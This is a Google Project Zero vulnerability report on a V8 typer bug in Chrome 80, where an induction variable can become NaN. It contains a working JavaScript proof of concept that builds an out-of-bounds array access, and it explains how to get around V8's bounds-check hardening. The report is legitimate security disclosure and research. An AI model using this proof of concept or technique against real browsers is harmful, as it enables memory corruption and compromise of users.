<b>VULNERABILITY DETAILS</b>
https://cs.chromium.org/chromium/src/v8/src/compiler/typer.cc?rcl=25c49d2bd6cbdc72b0779545d2a32406657befda&l=845
```
Type Typer::Visitor::TypeInductionVariablePhi(Node* node) {
[...]
  const bool both_types_integer = initial_type.Is(typer_->cache_->kInteger) &&
                                  increment_type.Is(typer_->cache_->kInteger);
  bool maybe_nan = false;
  // The addition or subtraction could still produce a NaN, if the integer
  // ranges touch infinity.
  if (both_types_integer) {
    Type resultant_type =
        (arithmetic_type == InductionVariable::ArithmeticType::kAddition)
            ? typer_->operation_typer()->NumberAdd(initial_type, increment_type)
            : typer_->operation_typer()->NumberSubtract(initial_type,
                                                        increment_type);
    maybe_nan = resultant_type.Maybe(Type::NaN()); // *** 1 ***
  }

[...]

  if (arithmetic_type == InductionVariable::ArithmeticType::kAddition) {
    increment_min = increment_type.Min();
    increment_max = increment_type.Max();
  } else {
    DCHECK_EQ(InductionVariable::ArithmeticType::kSubtraction, arithmetic_type);
    increment_min = -increment_type.Max();
    increment_max = -increment_type.Min();
  }

  if (increment_min >= 0) {
[...]
  } else if (increment_max <= 0) {
[...]
  } else {
    // Shortcut: If the increment can be both positive and negative,
    // the variable can go arbitrarily far, so just return integer.
    return typer_->cache_->kInteger; // *** 2 ***
  }
```

https://chromium.googlesource.com/v8/v8.git/+/b8b6075021ade0969c6b8de9459cd34163f7dbe1 is a fix for
a security issue in the implementation of loop variable analysis. The patch makes the typer
recognize cases where in statements like `for (var i = start; i < ...; i += increment) { ... }` the
loop variable can become `NaN` because `start` and `increment` are `Infinity` values of differing
sign[1].

Unfortunately, the introduced check is not sufficient to catch all loops that can produce `NaN`. The
code assumes that when the increment variable can be both positive and negative, the result type
will be `kInteger` (which doesn't include `NaN`). However, since the value of `increment` can be
changed from inside the loop body, it's possible, for example, to keep subtracting from `i` until it
reaches `-Infinity`, and then set `increment` to `+Infinity`. This will make `i` become `NaN` in the
next iteration of the loop.


<b>VERSION</b>
Google Chrome 80.0.3987.87 (Official Build) (64-bit)
Chromium 82.0.4055.0 (Developer Build) (64-bit)


<b>REPRODUCTION CASE</b>
```
<script>
function trigger() {
  var x = -Infinity;
  var k = 0;
  for (var i = 0; i < 1; i += x) {
      if (i == -Infinity) {
        x = +Infinity;
      }

      if (++k > 10) {
        break;
      }
  }

  var value = Math.max(i, 1024);
  value = -value;
  value = Math.max(value, -1025);
  value = -value;
  value -= 1022;
  value >>= 1; // *** 3 ***
  value += 10; //

  var array = Array(value);
  array[0] = 1.1;
  return [array, {}];
};

for (let i = 0; i < 20000; ++i) {
  trigger();
}

console.log(trigger()[0][11]);
</script>
```

Previously, the go-to exploitation technique for typer bugs was to make the compiler eliminate array
bounds checks based on incorrect type information and thus trigger OOB access. The technique no
longer works due to the hardening landed at https://bugs.chromium.org/p/v8/issues/detail?id=8806.

The proof-of-concept code above uses a different approach. The idea is to construct a JSArray for
which the `length` field is larger than the capacity of its backing store. An attacker can abuse
`ReduceJSCreateArray` optimization to achieve that:

https://cs.chromium.org/chromium/src/v8/src/compiler/js-create-lowering.cc?rcl=127c33f058f9fa2a28d17ea27094242666e033cd&l=611
```
Reduction JSCreateLowering::ReduceJSCreateArray(Node* node) {
[...]
  } else if (arity == 1) {
    Node* length = NodeProperties::GetValueInput(node, 2);
    Type length_type = NodeProperties::GetType(length);
    if (!length_type.Maybe(Type::Number())) {
      // Handle the single argument case, where we know that the value
      // cannot be a valid Array length.
      elements_kind = GetMoreGeneralElementsKind(
          elements_kind, IsHoleyElementsKind(elements_kind) ? HOLEY_ELEMENTS
                                                            : PACKED_ELEMENTS);
      return ReduceNewArray(node, std::vector<Node*>{length}, *initial_map,
                            elements_kind, allocation,
                            slack_tracking_prediction);
    }
    if (length_type.Is(Type::SignedSmall()) && length_type.Min() >= 0 &&
        length_type.Max() <= kElementLoopUnrollLimit &&
        length_type.Min() == length_type.Max()) { // *** 4 ***
      int capacity = static_cast<int>(length_type.Max()); // *** 5 ***
      return ReduceNewArray(node, length, capacity, *initial_map, elements_kind,
                            allocation, slack_tracking_prediction);
```

When the `length` argument is proven to be a tiny integer[4], the optimizer will use the predicted
value to allocate the backing store[5], but will use the actual value to initialize the `length`
field of the array.

The attacker also needs to prevent constant folding of the incorrectly typed variable. Once the
possible range of the variable gets shrunk to a single value, the exploit may only use ineliminable
nodes (for example, the PoC calls `SpeculativeNumberShiftRight` and `SpeculativeSafeIntegerAdd`).

As a result, the attacker will obtain a similar OOB access primitive, which is extremely convenient
for exploitation.


<b>CREDIT INFORMATION</b>
Sergei Glazunov of Google Project Zero


This bug is subject to a 90 day disclosure deadline. After 90 days elapse, the bug report will
become visible to the public. The scheduled disclosure date is 2020-05-11. Disclosure at an earlier
date is also possible if agreed upon by all parties.
